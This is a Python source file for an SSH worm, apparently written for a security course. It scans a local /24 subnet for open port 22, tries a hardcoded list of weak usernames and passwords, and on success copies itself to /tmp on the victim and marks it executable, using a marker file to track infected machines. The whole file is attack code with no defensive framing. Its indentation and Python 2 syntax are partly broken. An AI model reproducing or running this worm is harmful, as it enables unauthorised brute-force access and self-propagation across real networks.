import paramiko
import sys
import socket
import nmap
import netinfo
import os
import netifaces

# The list of credentials to attempt
credList = [
('hello', 'world'),
('hello1', 'world'),
('root', '#Gig#'),
('cpsc', 'cpsc'),
]

# The file marking whether the worm should spread
INFECTED_MARKER_FILE = "/tmp/infected.txt"

##################################################################
# Returns whether the worm should spread
# @return - True if the infection succeeded and false otherwise
##################################################################
def isInfectedSystem():
    return os.path.exists(INFECTED_MARKER_FILE)


#################################################################
# Marks the system as infected
#################################################################
def markInfected():
    f = open(INFECTED_MARKER_FILE, "w")
    f.close()


###############################################################
# Spread to the other system and execute
# @param sshClient - the instance of the SSH client connected
# to the victim system
###############################################################
def spreadAndExecute(sshClient):
    sftpClient = sshClient.open_sftp()

    sftpClient.put("worm.py", "/tmp/" + "worm.py")

    sshClient.exec_command("chmod a+x /tmp/worm.py")

    sftpClient.close()

    sshClient.close()



############################################################
# Try to connect to the given host given the existing
# credentials
# @param host - the host system domain or IP
# @param userName - the user name
# @param password - the password
# @param sshClient - the SSi client
# return - 0 = success, 1 = probably wrong credentials, and
# 3 = probably the server is down or is not running SSH
###########################################################
def tryCredentials(host, userName, passWord, sshClient):
    print("Attempting host %s with credentials u: %s, p: %s" % (host, userName, passWord)) 
    try:
        sshClient.connect(host, username=userName, password=passWord)
        return 0
    except paramiko.AuthenticationException, error:
        print(error)
        return 1
    except socket.error, error:
        print(error)
        return 3


###############################################################
# Wages a dictionary attack against the host
# @param host - the host to attack
# @return - the instace of the SSH paramiko class and the
# credentials that work in a tuple (ssh, username, password).
# If the attack failed, returns a NULL
###############################################################
def attackSystem(host):
	
    # The credential list
    global credList
	
    # Create an instance of the SSH client
    ssh = paramiko.SSHClient()

    # Set some parameters to make things easier.
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	
    # The results of an attempt
    attemptResults = None
				
    # Go through the credentials
    for (username, password) in credList:
        if tryCredentials(host, username, password, ssh) == 0:
            return (ssh, username, password)
    # Could not find working credentials
    else:
        return None	


####################################################
# Returns the IP of the current system
# @param interface - the interface whose IP we would
# like to know
# @return - The IP address of the current system
####################################################
def getMyIP(interface):
    return netifaces.ifaddresses(interface)[2][0]['addr']


#######################################################
# Returns the list of systems on the same network
# @return - a list of IP addresses on the same network
#######################################################
def getHostsOnTheSameNetwork():
    portScanner = nmap.PortScanner()

    portScanner.scan('192.168.1.0/24', arguments='-p 22 --open')

    return portScanner.all_hosts()


# If we are being run without a command line parameters, 
# then we assume we are executing on a victim system and
# will act maliciously. This way, when you initially run the 
# worm on the origin system, you can simply give it some command
# line parameters so the worm knows not to act maliciously
# on attackers system. If you do not like this approach,
# an alternative approach is to hardcode the origin system's
# IP address and have the worm check the IP of the current
# system against the hardcoded IP. 
if len(sys.argv) < 2:
    if isInfectedSystem():
        sys.exit("Already infected.")


# Get the IP of the current system
currentSystemInterface = ""

for netFaces in netifaces.interfaces():
    if netFaces == 'lo':
        continue
    else:
        currentSystemInterface = netFaces
        break

hostIP = getMyIP(currentSystemInterface)


# Get the hosts on the same network
networkHosts = getHostsOnTheSameNetwork()


# Remove the IP of the current system from the list of discovered systems.
networkHosts.remove(hostIP)

print("Found hosts: ", networkHosts)


# Go through the network hosts
for host in networkHosts:
	
    # Try to attack this host
    sshInfo =  attackSystem(host)
	
    # Did the attack succeed?
    if sshInfo:
        print("Trying to spread")
	try:
            remotepath = '/tmp/infected.txt'
	    localpath = '/home/cpsc/'
	    # Copy the file from the specified
	    # remote path to the specified
	    # local path. If the file does exist
	    # at the remote path, then get()
	    # will throw IOError exception
	    # (that is, we know the system is
	    # not yet infected).
            sftpClient = sshInfo[0].open_sftp()

	    sftpClient.get(remotepath, localpath)
	except IOError:
	    print("This system should be infected")
		# If the system was already infected proceed.
		# Otherwise, infect the system and terminate.
		# Infect that system
	    spreadAndExecute(sshInfo[0])
	else:
	    print("Spreading complete")
